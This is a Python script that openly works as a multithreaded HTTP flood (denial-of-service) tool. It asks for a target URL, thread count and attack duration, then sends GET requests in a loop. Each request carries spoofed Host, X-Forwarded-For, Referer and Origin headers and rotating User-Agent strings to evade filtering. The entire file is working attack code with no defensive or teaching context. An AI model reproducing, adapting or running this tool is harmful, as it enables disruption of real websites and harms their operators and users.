import requests
import threading
import random
import time

# Function to generate random DNS names
def generate_random_dns():
    subdomains = ["www", "mail", "ftp", "api", "cdn", "secure", "blog", "shop"]
    domains = ["example", "test", "demo", "sample", "random", "site"]
    tlds = [".com", ".org", ".net", ".info", ".biz"]
    return f"{random.choice(subdomains)}.{random.choice(domains)}{random.choice(tlds)}"

# Function to generate random IP addresses (simulating IP geofencing)
def generate_random_ip():
    # Simulate IPs from different countries or regions (for geofencing)
    ip_ranges = [
        "203.0.113",  # A common range for testing (US region)
        "192.0.2",    # Another test range
        "198.51.100", # Range for Europe (e.g., German IPs)
        "185.12.40",   # Random European range
        "10.0.0",      # Private IP space (internal use)
        "5.199.179"    # Simulating an IP from a different region
    ]
    return f"{random.choice(ip_ranges)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Function to generate random User-Agent strings
def generate_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
    ]
    return random.choice(user_agents)

# Function to send multiple requests
def send_request(url, stop_event):
    try:
        while not stop_event.is_set():  # Run until the stop event is triggered
            # Generate random DNS, IP address, and headers
            random_dns = generate_random_dns()
            ip_address = generate_random_ip()
            user_agent = generate_random_user_agent()
            headers = {
                "Host": random_dns,
                "X-Forwarded-For": ip_address,  # Simulated IP for geofencing
                "User-Agent": user_agent,
                "Referer": f"https://{random_dns}",  # Simulating a referer
                "Origin": f"https://{random_dns}"   # Simulating a different origin
            }

            # Send HTTP GET request to the target URL
            response = requests.get(url, headers=headers, timeout=3)

            # Check if the request was successful
            if response.status_code == 200:
                print(f"Request sent to {url} with DNS: {random_dns}, IP: {ip_address}, User-Agent: {user_agent}")
            else:
                print(f"Request failed with status code: {response.status_code}")
    except requests.exceptions.RequestException:
        print("Error occurred while sending a request.")

# Function to start the attack
def start_attack(url, num_threads, duration):
    stop_event = threading.Event()  # Event to stop threads after the duration
    threads = []

    # Launch threads
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url, stop_event))
        threads.append(t)
        t.start()

    # Let the attack run for the specified duration
    time.sleep(duration)
    stop_event.set()  # Signal threads to stop

    # Wait for all threads to finish
    for t in threads:
        t.join()

# Get user input for the target URL, number of threads, and duration
url = input("Enter the target URL: ").strip()
num_threads = int(input("Enter the number of threads: "))
duration = int(input("Enter the duration of the attack (in seconds): "))

# Start the attack
start_attack(url, num_threads, duration)